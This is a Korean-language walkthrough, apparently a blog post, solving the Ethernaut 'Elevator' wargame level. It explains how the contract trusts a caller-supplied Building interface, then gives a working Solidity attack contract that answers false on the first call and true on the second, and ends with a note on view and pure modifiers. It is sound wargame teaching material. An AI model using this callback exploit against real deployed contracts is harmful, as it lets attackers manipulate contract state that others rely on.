https://teberr.notion.site/Ethernaut-Elevator-97912ccf516249c59fbdf1249480b689

![문제파일.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3ec58b06-3805-4661-9410-d6d917aee9df/%EB%AC%B8%EC%A0%9C%ED%8C%8C%EC%9D%BC.png)

> 이 엘리베이터는 건물 꼭대기까지 갈 수 없습니다. 맞나요?

힌트
- 가끔식 솔리디티는 약속을 유지하기에는 좋지 않습니다.
- 이 엘리베이터는 빌딩 컨트랙트에서 사용하도록 설계되었습니다
> 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

# 코드 분석 및 공격 설계

```solidity
interface Building {
  function isLastFloor(uint) external returns (bool);
}
```

인터페이스인 Building은 함수 isLastFloor(uint) external returns (bool)을 가지고 있다. 이 때 인터페이스에 있는 함수 같은 경우 상속받고 나서 override를 써주면 함수를 재정의하여 줄 수 있다.

```solidity
contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

핵심 부분은 Building building = Building(msg.sender); 부분이다.

Building 인터페이스를 만족하는 msg.sender 주소를 받아 building 변수에 저장한다. 

여기서 **msg.sender 주소가 Building 인터페이스를 만족하기만 하면 되기 때문에** Building 인터페이스를 상속받은 컨트랙트를 생성하여 isLastFloor를 오버라이딩하여 top이 True가 되도록 해주면 된다.

```solidity
    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
```

이 때 building.isLastFloor가 무조건 true일 경우 조건문 내부로 들어가지 않아서 top에 True를 저장하지 못하기 때문에 **처음에는 False, 다시 호출되었을 때는 True**를 반환하게 해줘야 한다.

그렇게 만든 컨트랙트에서 goTo를 호출하게 되면 컨트랙트의 주소가 msg.sender가 되고 이 컨트랙트는 Building 인터페이스를 충족하므로 내 컨트랙트의 isLastFloor가 실행되게 된다.

컨트랙트를 상속받을 때는 다음과 같은 구조로 받으면 된다.

```solidity
contract '새로운 컨트랙트' is '부모컨트랙트'
```

그리고 부모 컨트랙트의 함수를 오버라이딩 할 때는 

**함수명(매개변수) override**

형태로 오버라이딩 해주고 내용은 내가 원하는 대로 해주면 된다.

# 공격

먼저 인스턴스를 생성해주면 인스턴스의 주소를 얻을 수 있다.

![컨트랙트 주소.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b8dacd35-f964-4016-b8ab-8b5f3f3950db/%EC%BB%A8%ED%8A%B8%EB%9E%99%ED%8A%B8_%EC%A3%BC%EC%86%8C.png)

```solidity
=> Instance address
0x8FaaF9976E65656Da98727C0a0BE39B8C1294b53
```

인스턴스 주소를 얻었으므로 Building 인터페이스를 상속받는 컨트랙트를 작성하자.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

interface IElevator{
    function goTo(uint _floor) external ;
}

contract BuildingAttack is Building{

    IElevator Elevator;
    bool public result = true;

    constructor(address _addr) public {
        Elevator = IElevator(_addr);
    }
    function isLastFloor(uint) override public returns(bool){
        if(result){
            result=false;
            return result;
        }
        result=true;
        return result;
        
    }

    function Attack() public {
        Elevator.goTo(1);
    }

}
```

코드 작성의 핵심은 다음과 같다.

- 처음 Deploy할 때 문제 인스턴스의 주소를 받을 수 있도록 생성자를 작성해주었다.
- 초기 result 값을 true로 하여 처음 isLastFloor가 호출되었을 때는 false를 리턴, 두번째로 호출되었을 때는 true가 리턴되도록 해주었다.
- Attack은 문제 인스턴스의 goTo함수를 호출해 주는 함수이다. floor의 숫자는 중요하지 않으므로 아무 숫자나 넣어주었다.

![Deploy.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/37a87e6c-6de1-4621-a9c0-0697cf212f6c/Deploy.png)

따라서 인스턴스의 주소를 넣어서 Deploy해주고

![attack.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/4cd50b66-5e64-4fb5-a441-9c89ce9357a3/attack.png)

attack을 통해서 공격을 해주고 나면

![공격 후.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/30cca254-d8eb-4d22-b539-a0c26d4653c7/%EA%B3%B5%EA%B2%A9_%ED%9B%84.png)

```solidity
await contract.top()
true
```

문제 인스턴스의 top이 true로 된것 을 확인할 수 있다. 문제의 목적인 top을 true로 만들기(꼭대기 층에 도착하기)를 성공하였으므로 인스턴스를 제출하자.

![성공.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d5f1bf66-bb32-425b-a99b-7635dd027508/%EC%84%B1%EA%B3%B5.png)

문제를 푸는데 성공했음을 확인할 수 있다.

# 문제 후기

View : function 밖의 변수들을 읽을 수 있으나 변경은 불가능 

pure : function 밖의 변수들을 읽지도 못하고 변경도 불가능

함수 밖의 상태 변수들을 의도치 않은 결과값으로 변환해 버리는 것을 막기 위해서는 함수 밖의 상태 변수를 수정하지 않는 view 를 사용한 모디파이어나 함수 밖의 상태 변수를 읽지도 쓰지도 못하는 pure 모디파이어를 이용해 막을 수 있다.
